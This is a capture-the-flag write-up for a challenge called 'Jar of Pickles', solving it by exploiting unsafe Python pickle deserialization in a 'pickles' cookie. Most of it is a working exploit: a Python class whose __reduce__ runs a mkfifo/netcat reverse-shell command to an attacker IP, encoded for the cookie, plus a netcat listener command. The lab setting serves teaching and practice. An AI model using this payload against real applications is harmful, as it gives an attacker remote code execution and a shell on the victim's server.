# Name: Jar of Pickles

## Vulnerability

Unsafe usafe of Python3 `pickle` module.

## Exploit

Note! The exploit involves opening a reverse shell, you may need to read [this article](https://securiumsolutions.com/blog/reverse-shell-using-tcp/) first.
You'll need to change with you own IP and port to connect to it.

Click on the picture, it will take you to `/jar`.
Notice the `pickles` cookie.

Use `nc -nvlk 1234` in another terminal to open a connection to your machine first.

Then run this program that prints the encoded pickled object of this class that spawns a shell (change the IP to yours).

```python
import base64
import os
import pickle
import requests

YOUR_IP = "127.0.0.1"

class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s 1234 > /tmp/f" % YOUR_IP

        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode("utf-8"))
```

Take the output and set it as the Cookie value.
Make the request again.
You should have a shell now in the `nc` terminal; perform a `cat` on the flag file.

Exploit in `../sol/solution.sh`.
